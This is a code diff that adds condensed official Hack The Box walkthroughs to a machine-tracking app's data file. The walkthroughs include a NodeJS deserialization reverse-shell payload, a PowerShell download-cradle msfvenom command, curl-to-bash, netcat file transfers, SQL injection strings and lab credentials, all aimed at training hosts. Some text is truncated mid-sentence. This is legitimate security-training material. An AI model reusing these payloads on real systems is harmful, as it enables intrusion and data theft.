+    "officialSynopsis": "Olympia is not overly difficult, however there are many steps involved in getting access to the main system. There is a heavy focus on the use of Docker, with a variety of topics and techniques along the way.",
+    "skillsLearned": [
+      "Exploiting Xdebug",
+      "Identifying Docker instances",
+      "Cracking WPA handshakes",
+      "Gathering information through zone",
+      "transfers",
+      "Abusing Docker permissions"
+    ],
+    "officialPdf": "135-Olympus_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nOlympia is not overly difficult, however there are many steps involved in getting access to the main system. There is a heavy focus on the use of Docker, with a variety of topics and techniques along the way.\n\n### 🎯 Core Skills\n- **Exploiting Xdebug**\n- **Identifying Docker instances**\n- **Cracking WPA handshakes**\n- **Gathering information through zone**\n- **transfers**\n- **Abusing Docker permissions**\n\n### ⚔️ Foothold Vector\nXdebug Exploit: https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce Looking at the HTTP headers reveals Xdebug 2.5.5 is running on the target, which has a remote code execution vulnerability. Using the above exploit, an initial shell is achieved. The presence of the file /.dockerenv suggests that the shell is inside a Docker container. A bit of searching around the filesystem reveals a captured.cap file in the airgeddon installation at /home/zeus, which can be transferred by running nc -lp 1235 > captured.cap on the attacking machine and nc -w 3 LAB_IP 1235 < captured.cap on the target.\n\n### 👑 Privilege Escalation\ndirectory reveals it is another Docker container."
   },
   {
     "id": "htb-canape",
@@ -9798,15 +12028,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "CVE-2017-12636",
+      "Exploiting-Sudo-NOPASSWD",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/canape",
     "writeupUrl": "https://0xdf.gitlab.io/tags#canape",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Canape is a moderate difficulty machine, however the use of a file (.git) that is not included in the dirbuster wordlists can greatly increase the difficulty for some users. This machine also requires a basic understanding of Python to be able to find the exploitable point in the",
     "timeSpentSeconds": 0,
     "createdAt": "2018-04-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Canape is a moderate difficulty machine, however the use of a file (.git) that is not included in the dirbuster wordlists can greatly increase the difficulty for some users. This machine also requires a basic understanding of Python to be able to find the exploitable point in the application.",
+    "skillsLearned": [
+      "Exploiting insecure Python Pickling",
+      "Exploiting Apache CouchDB",
+      "Exploiting Sudo NOPASSWD"
+    ],
+    "officialPdf": "134-Canape_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCanape is a moderate difficulty machine, however the use of a file (.git) that is not included in the dirbuster wordlists can greatly increase the difficulty for some users. This machine also requires a basic understanding of Python to be able to find the exploitable point in the application.\n\n### 🎯 Core Skills\n- **Exploiting insecure Python Pickling**\n- **Exploiting Apache CouchDB**\n- **Exploiting Sudo NOPASSWD**\n\n### 🛡️ Associated CVEs\n`CVE-2017-12636`\n\n### ⚔️ Foothold Vector\nPython Pickle With access to the source of the Python flask application which runs the website, it is possible to develop an exploit to abuse the function for storing submitted quotes. The submit route of the flask app checks to make sure the character variable contains a valid Simpsons character, however passing the name directly will cause the app to create an invalid pickle file. By including the character name as part of the os command and splitting the pickle data between character and quote, the check will pass and the data will be recombined server-side.\n\n### 👑 Privilege Escalation\nHomer - Apache CouchDB Exploit: https://www.exploit-db.com/exploits/44913/ Explanation: https://justi.cz/security/2017/11/14/couchdb-rce-npm.html Running ps aux reveals that Apache CouchDB is running as the homer user. A quick search finds CVE-2017-12636, which is a code execution vulnerability in CouchDB < 2.1.0. The Exploit-DB proof of concept has some issues in this instance, so directly using the cURL example from the explanation link is a good alternative."
   },
   {
     "id": "htb-rabbit",
@@ -9817,15 +12057,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Authorisation-bypass",
+      "HTB",
+      "Payload-creation"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/rabbit",
     "writeupUrl": "https://0xdf.gitlab.io/tags#rabbit",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Rabbit is a fairly realistic machine which provides excellent practice for client-side attacks and web app",
     "timeSpentSeconds": 0,
     "createdAt": "2018-03-31T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Rabbit is a fairly realistic machine which provides excellent practice for client-side attacks and web app",
+    "skillsLearned": [
+      "Open Office macro modification",
+      "Payload creation",
+      "Authorisation bypass",
+      "SQL injection identification and"
+    ],
+    "officialPdf": "133-Rabbit_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRabbit is a fairly realistic machine which provides excellent practice for client-side attacks and web app\n\n### 🎯 Core Skills\n- **Open Office macro modification**\n- **Payload creation**\n- **Authorisation bypass**\n- **SQL injection identification and**\n\n### ⚔️ Foothold Vector\n● Windows services and file system permission enumeration\n\n### 👑 Privilege Escalation\nAfter a short while, a shell is received as a low privileged user and the system can be enumerated. There is a wamp folder in the root of the C:\\ and wamp is running as SYSTEM. Inspection of the permissions on C:\\wamp64\\www reveals that the \"BUILTIN\\Users\" group has the ability to write and append data (AD/WD). After downloading a webshell to this folder, the existing malicious binary can be executed to get a shell as \"NT AUTHORITY\\SYSTEM\". Reference: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and -2008/cc753525(v=ws.10)"
   },
   {
     "id": "htb-poison",
@@ -9836,15 +12087,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Apache-log-poisoning",
+      "HTB",
+      "Tunneling-ports-over-SSH"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/poison",
     "writeupUrl": "https://0xdf.gitlab.io/tags#poison",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-03-24T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.",
+    "skillsLearned": [
+      "Apache log poisoning",
+      "Tunneling ports over SSH"
+    ],
+    "officialPdf": "132-Poison_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPoison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.\n\n### 🎯 Core Skills\n- **Apache log poisoning**\n- **Tunneling ports over SSH**\n\n### ⚔️ Foothold Vector\nLog Poisoning On the Apache server's homepage there is an input that is vulnerable to local file inclusion. Checking /etc/passwd shows that the target is running FreeBSD. By intercepting a request with BurpSuite and modifying the useragent to include a PHP script, code execution can be achieved. This will inject the PHP script into the Apache access log at /var/log/httpd-access.log which can then be included using browse.php\n\n### 👑 Privilege Escalation\nCharix In the web directory there is a pwdbackup.txt file which contains a base64-encoded string. It is recursively encoded 13 times. Running it through a decoder 13 times reveals the password as Charix!2#4%6&8(0 It is possible to use this password for the charix user over SSH. Once logged in, there is a secret.zip file in the home directory which can be extracted using the same password. The file can be transferred locally with nc -lp 1234 > secret.zip on the attacking machine and nc -w 3 <LAB IP> 1234 < secret.zip on the target."
   },
   {
     "id": "htb-celestial",
@@ -9855,15 +12115,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "NodeJS"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/celestial",
     "writeupUrl": "https://0xdf.gitlab.io/tags#celestial",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects in NodeJS framework.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-03-10T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Celestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects in NodeJS framework.",
+    "skillsLearned": [
+      "Exploiting object deserialization in",
+      "NodeJS",
+      "Enumerating system log files"
+    ],
+    "officialPdf": "130-Celestial_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCelestial is a medium difficulty machine which focuses on deserialization exploits. It is not the most realistic, however it provides a practical example of abusing client-size serialized objects in NodeJS framework.\n\n### 🎯 Core Skills\n- **Exploiting object deserialization in**\n- **NodeJS**\n- **Enumerating system log files**\n\n### ⚔️ Foothold Vector\nNodeJS Deserialization Viewing the NodeJS server in a browser presents a 404, however after refreshing the page, some text is displayed. Looking at cookies reveals a profile entry, which is a base64-encoded JSON string. Attempting to change the num value to an unquoted string will cause an error which reveals some key information. The username is sun and the data appears to be unserialized. A quick search finds several guides on building a serialized payload for code execution through NodeJS. In this case, an exec function can be passed as the username and it will be executed. {\"username\":\"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.\n\n### 👑 Privilege Escalation\nRoot As the sun user is part of the admin group, it has access to read most log files. Looking at /var/www/syslog reveals a root cronjob which executes /home/sun/Documents/script.py every 5 minutes. As the script is owned by the current user, modifying the script to create a reverse shell is all that is needed for escalation."
   },
   {
     "id": "htb-stratosphere",
@@ -9874,15 +12143,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-Sudo-NOPASSWD",
+      "HTB",
+      "Struts"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/stratosphere",
     "writeupUrl": "https://0xdf.gitlab.io/tags#stratosphere",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Stratosphere focuses on the use of an Apache Struts code execution vulnerability which was leveraged in a large-scale breach, resulting in the disclosure of millions of peoples' credit information.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-03-03T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Stratosphere focuses on the use of an Apache Struts code execution vulnerability which was leveraged in a large-scale breach, resulting in the disclosure of millions of peoples' credit information.",
+    "skillsLearned": [
+      "Identifying and Exploiting Apache",
+      "Struts",
+      "Exploiting Sudo NOPASSWD",
+      "Hijacking Python libraries"
+    ],
+    "officialPdf": "129-Stratosphere_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nStratosphere focuses on the use of an Apache Struts code execution vulnerability which was leveraged in a large-scale breach, resulting in the disclosure of millions of peoples' credit information.\n\n### 🎯 Core Skills\n- **Identifying and Exploiting Apache**\n- **Struts**\n- **Exploiting Sudo NOPASSWD**\n- **Hijacking Python libraries**\n\n### ⚔️ Foothold Vector\nApache Struts Exploit: https://github.com/mazen160/struts-pwn Using the above exploit is very straightforward, however there is a fairly restrictive firewall that prevents a basic reverse shell. Viewing the contents of db_connect in the current directory exposes some MySQL credentials (admin:admin). Using this, it is possible to obtain the richard user's SSH password.\n\n### 👑 Privilege Escalation\nPython Library Hijacking Running sudo -l reveals that richard is able to run /usr/bin/python* /home/richard/test.py, however richard does not have write permissions for the script. Examining the script shows that hashlib is imported. By creating hashlib.py in the same directory, python will import this module instead of the real hashlib and execute the contents."
   },
   {
     "id": "htb-bart",
@@ -9893,15 +12173,31 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Enumerating-subdomains",
+      "HTB",
+      "Log-poisoning",
+      "combinations"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bart",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bart",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Bart is a fairly realistic machine, mainly focusing on proper",
     "timeSpentSeconds": 0,
     "createdAt": "2018-02-24T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bart is a fairly realistic machine, mainly focusing on proper",
+    "skillsLearned": [
+      "Troubleshooting web fuzzing tools",
+      "Enumerating potential credential",
+      "combinations",
+      "Enumerating subdomains",
+      "Reviewing open source software for",
+      "changes and vulnerabilities",
+      "Log poisoning",
+      "Pass the hash technique without direct"
+    ],
+    "officialPdf": "128-Bart_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBart is a fairly realistic machine, mainly focusing on proper\n\n### 🎯 Core Skills\n- **Troubleshooting web fuzzing tools**\n- **Enumerating potential credential**\n- **combinations**\n- **Enumerating subdomains**\n- **Reviewing open source software for**\n- **changes and vulnerabilities**\n- **Log poisoning**\n- **Pass the hash technique without direct**\n\n### ⚔️ Foothold Vector\nMonitor Using Burp Intruder or any similar tool, it is fairly simple to find valid credentials for the monitor login page. A valid login (harvey:potter) will result in a redirect to monitor.bart.htb, which must be added to /etc/hosts. Attempting to view the chat reveals the subdomain internal-01.bart.htb.\n\n### 👑 Privilege Escalation\nAdministrator PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc Executing powershell with powershell -ExecutionPolicy Bypass will allow running of local scripts. After dropping PowerUp on the target and starting powershell, it can be loaded with Import-Module ./PowerUp.ps1 and executed with Invoke-AllChecks, revealing Administrator autologon credentials in the registry. As SMB is not open to the network, a route must be added or alternatively port forwarding can be used. To simplify things, switching to Metasploit is ideal. Using the windows/smb/smb_delivery module successfully spawns a Meterpreter session when using the following settings."
   },
   {
     "id": "htb-valentine",
@@ -9912,15 +12208,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploiting-Heartbleed",
+      "HTB",
+      "Heartbleed"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/valentine",
     "writeupUrl": "https://0xdf.gitlab.io/tags#valentine",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-02-17T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.",
+    "skillsLearned": [
+      "Identifying servers vulnerable to",
+      "Heartbleed",
+      "Exploiting Heartbleed",
+      "Exploiting permissive tmux sessions"
+    ],
+    "officialPdf": "127-Valentine_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nValentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.\n\n### 🎯 Core Skills\n- **Identifying servers vulnerable to**\n- **Heartbleed**\n- **Exploiting Heartbleed**\n- **Exploiting permissive tmux sessions**\n\n### ⚔️ Foothold Vector\nHeartbleed Exploit: https://github.com/sensepost/heartbleed-poc Using the above exploit, it is fairly straightforward to obtain some sensitive information from memory. Running it several times should yield a base64-encoded string. Decoding the base64 reveals the passphrase for hype_key which can be used to connect via SSH as the hype user.\n\n### 👑 Privilege Escalation\ntmux Running ps aux reveals a tmux session being run as the root user. Simply running the command tmux -S /.devs/dev_sess will connect to the session, with full root privileges."
   },
   {
     "id": "htb-aragog",
@@ -9936,10 +12243,18 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/aragog",
     "writeupUrl": "https://0xdf.gitlab.io/tags#aragog",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Aragog is not overly challenging, however it touches on several common real-world vulnerabilities, techniques and misconfigurations.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-02-10T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Aragog is not overly challenging, however it touches on several common real-world vulnerabilities, techniques and misconfigurations.",
+    "skillsLearned": [
+      "Exploiting XML External Entities",
+      "Enumerating files through XXE",
+      "Exploiting weak file permissions"
+    ],
+    "officialPdf": "126-Aragog_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAragog is not overly challenging, however it touches on several common real-world vulnerabilities, techniques and misconfigurations.\n\n### 🎯 Core Skills\n- **Exploiting XML External Entities**\n- **Enumerating files through XXE**\n- **Exploiting weak file permissions**\n\n### ⚔️ Foothold Vector\nXML External Entities Attempting to connect to FTP reveals only a test.txt file which contains some basic XML. Sending the XML in a POST request to hosts.php results in some different output. Using this, it is trivial to craft a request that abuses external entities to read files on the system.\n\n### 👑 Privilege Escalation\nWeb Server Write Access Automated enumeration tools are not necessary to find the correct escalation vector in this case. As this is a CTF system, any type of user interaction must be automated. Running ps aux reveals a whoopsie user running /usr/bin/whoopsie. This binary can be reverse engineered (much more challenging) to obtain the SUDO password. The purpose of this binary is to simulate a user logging into the Wordpress installation at http://aragog/dev_wiki Since the entire /var/www/html directory is chmod 777, it is possible to modify wp-login.php to capture any supplied credentials. The login credentials are sent in $_POST['log'] and $_POST['pwd']."
   },
   {
     "id": "htb-falafel",
@@ -9950,15 +12265,27 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Boolean",
+      "HTB",
+      "based-SQL-injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/falafel",
     "writeupUrl": "https://0xdf.gitlab.io/tags#falafel",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Falafel is not overly challenging, however it requires several unique tricks and techniques in order to successfully exploit. Numerous hints are provided, although proper",
     "timeSpentSeconds": 0,
     "createdAt": "2018-02-03T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Falafel is not overly challenging, however it requires several unique tricks and techniques in order to successfully exploit. Numerous hints are provided, although proper",
+    "skillsLearned": [
+      "Boolean",
+      "based SQL injection",
+      "Exploiting system file name restrictions",
+      "Exploiting video group permissions",
+      "Exploiting disk group permissions"
+    ],
+    "officialPdf": "124-Falafel_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFalafel is not overly challenging, however it requires several unique tricks and techniques in order to successfully exploit. Numerous hints are provided, although proper\n\n### 🎯 Core Skills\n- **Boolean**\n- **based SQL injection**\n- **Exploiting system file name restrictions**\n- **Exploiting video group permissions**\n- **Exploiting disk group permissions**\n\n### ⚔️ Foothold Vector\nSQL Injection & PHP Type Juggling The login page can be exploited with a boolean-based SQL injection. SQLMap is very useful, however the --string flag must be specified for it to be successful. The command sqlmap -r login.req --level=5 --risk=3 --string=\"Wrong identification\" --technique=B -T users -D falafel --dump will dump the users table, where login.req is a file containing an intercepted login POST request. The chris user's password is a hint that type juggling can be used. As the admin hash begins with 0e, any other hash which also begins with 0e and is followed by all integers will be valid if a basic == comparison is used.\n\n### 👑 Privilege Escalation\nMoshe The credentials for the moshe user can be easily found in /var/www/html/connection.php. Re-using the database password with su or attempting to SSH as moshe will succeed."
   },
   {
     "id": "htb-chatterbox",
@@ -9969,15 +12296,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/chatterbox",
     "writeupUrl": "https://0xdf.gitlab.io/tags#chatterbox",
-    "hint": "Hack The Box Windows machine. Rated Medium difficulty.",
+    "hint": "Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-01-27T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Chatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.",
+    "skillsLearned": [
+      "Modifying publicly available exploits",
+      "Basic PowerShell reverse shell",
+      "techniques",
+      "Enumerating Windows Registry"
+    ],
+    "officialPdf": "123-Chatterbox_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nChatterbox is a fairly straightforward machine that requires basic exploit modification or Metasploit troubleshooting skills to complete.\n\n### 🎯 Core Skills\n- **Modifying publicly available exploits**\n- **Basic PowerShell reverse shell**\n- **techniques**\n- **Enumerating Windows Registry**\n\n### ⚔️ Foothold Vector\nAChat Buffer Overflow Exploit: https://www.exploit-db.com/exploits/36025/ Using msfvenom, it is possible to generate shellcode for use in the above exploit. The command msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \\\"IEX(New-Object Net.WebClient).downloadString('http://<LABIP>/writeup.\n\n### 👑 Privilege Escalation\nAdministrator PowerUp: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 Running PowerUp reveals a set of Autologon credentials hidden in the registry. Attempting to re-use this password with the Administrator account is successful, and can be achieved using powershell or by opening SMB and using impacket's psexec. Using powershell, the command $passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd) will store the credentials in $creds for the session."
   },
   {
     "id": "htb-nightmare",
@@ -9988,15 +12325,32 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2017-1000112",
+      "Exploit-modification",
+      "HTB",
+      "Reverse-engineering-64",
+      "SSH-brute-forcing",
+      "bit-binaries"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/nightmare",
     "writeupUrl": "https://0xdf.gitlab.io/tags#nightmare",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Nightmare is a very challenging machine which has many access restrictions in place. It focuses mainly on several unique topics and exploit modification, however since its release a valid 32-bit version of the exploit PoC has been released.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-01-20T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Nightmare is a very challenging machine which has many access restrictions in place. It focuses mainly on several unique topics and exploit modification, however since its release a valid 32-bit version of the exploit PoC has been released.",
+    "skillsLearned": [
+      "Second order SQL injection",
+      "SSH brute forcing",
+      "Exploiting misconfigured sFTP",
+      "Attacking without touching disk",
+      "Reverse engineering 64",
+      "bit binaries",
+      "Exploit modification"
+    ],
+    "officialPdf": "122-Nightmare_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNightmare is a very challenging machine which has many access restrictions in place. It focuses mainly on several unique topics and exploit modification, however since its release a valid 32-bit version of the exploit PoC has been released.\n\n### 🎯 Core Skills\n- **Second order SQL injection**\n- **SSH brute forcing**\n- **Exploiting misconfigured sFTP**\n- **Attacking without touching disk**\n- **Reverse engineering 64**\n- **bit binaries**\n- **Exploit modification**\n\n### 🛡️ Associated CVEs\n`CVE-2017-1000112`\n\n### ⚔️ Foothold Vector\nSQL Injection The notes.php page is vulnerable to second order SQL injection. As the username is passed unfiltered in a secondary query after registration, it is possible to create an account with an SQL query as the username. Upon loading the notes page after logging in, the results of the SQL query will be visible. Registering with a username of a') UNION SELECT TABLE_NAME,2 FROM information_schema.tables-- - will reveal all table and column names. Running a') UNION SELECT username,password FROM sysadmin.users-- - will reveal multiple sets of credentials in plaintext.\n\n### 👑 Privilege Escalation\nDecoder - GUID Binary As the ftpuser does not have write access, it is possible to utilize curl to pipe LinEnum to bash. For example: curl -s http://<LAB IP>/linenum.sh | bash. Note that LinEnum must be slightly modified to force thorough checks without the -t flag. LinEnum finds a GUID file for the Decoder user at /usr/bin/sls, which can be easily exfiltrated through Base64 encode/decode or netcat. IppSec's Nightmare video demonstrates how to reverse engineer the binary in great detail using Radare2. Video: https://www.youtube.com/watch?v=frh-jYaUvrU&t=4975s By passing the -b flag, the sls binary does not filter newline characters."
   },
   {
     "id": "htb-nibbles",
@@ -10007,12 +12361,13 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
+      "Exploiting-NOPASSWD",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/nibbles",
     "writeupUrl": "https://0xdf.gitlab.io/tags#nibbles",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.",
     "timeSpentSeconds": 3600,
     "createdAt": "2018-01-13T17:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -10021,7 +12376,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.",
+    "skillsLearned": [
+      "Enumerating web applications",
+      "Guessing probable passwords",
+      "Bypassing login rate limiting",
+      "Exploiting NOPASSWD"
+    ],
+    "officialPdf": "121-Nibbles_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.\n\n### 🎯 Core Skills\n- **Enumerating web applications**\n- **Guessing probable passwords**\n- **Bypassing login rate limiting**\n- **Exploiting NOPASSWD**\n\n### ⚔️ Foothold Vector\nNibbleblog A quick search finds the Metasploit module exploit/multi/http/nibbleblog_file_upload, however this exploit requires valid credentials (admin:nibbles). There is a login blacklist system in place, so manual guessing is required. The username can be enumerated from /nibbleblog/content/private/users.xml.\n\n### 👑 Privilege Escalation\nRoot Running sudo -l to check for any NOPASSWD binaries reveals an entry for /home/nibbler/personal/stuff/monitor.sh. This file does not exist however, so it is possible to create a simple bash script in its place to achieve root access."
   },
   {
     "id": "htb-crimestoppers",
@@ -10037,10 +12401,19 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/crimestoppers",
     "writeupUrl": "https://0xdf.gitlab.io/tags#crimestoppers",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "CrimeStoppers is a fairly challenging machine, requiring several unique techniques in order to be successfully exploited. There are many hints and easter eggs present on the machine, with a heavy focus on avoiding the use of automated tools.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-01-06T17:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "CrimeStoppers is a fairly challenging machine, requiring several unique techniques in order to be successfully exploited. There are many hints and easter eggs present on the machine, with a heavy focus on avoiding the use of automated tools.",
+    "skillsLearned": [
+      "Exploiting PHP file creation mechanics",
+      "Exploiting PHP filters/wrappers",
+      "Extracting data from Thunderbird",
+      "Reverse engineering Apache modules"
+    ],
+    "officialPdf": "120-CrimeStoppers_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCrimeStoppers is a fairly challenging machine, requiring several unique techniques in order to be successfully exploited. There are many hints and easter eggs present on the machine, with a heavy focus on avoiding the use of automated tools.\n\n### 🎯 Core Skills\n- **Exploiting PHP file creation mechanics**\n- **Exploiting PHP filters/wrappers**\n- **Extracting data from Thunderbird**\n- **Reverse engineering Apache modules**\n\n### ⚔️ Foothold Vector\nAdmin Cookie While not necessary to complete the machine, modifying the plaintext cookie to obtain admin rights to the website will provide some additional hints.\n\n### 👑 Privilege Escalation\nDom Firefox Decrypt: https://github.com/unode/firefox_decrypt Exploring the dom user's directory reveals a Thunderbird installation. Simply copying the files and loading the profile in Thunderbird locally, or running strings on global-messages-db.sqlite, will provide a tip suggesting rkhunter identified a backdoor Apache module. Using the above tool, it is possible to recover dom's password. By default there is no master password set for Thunderbird, and recovering the password is trivial. Running the command netstat -lp shows that SSH is listening on IPv6. The IPv6 address of the target can be easily obtained with ifconfig or ip addr."
   },
   {
     "id": "htb-fluxcapacitor",
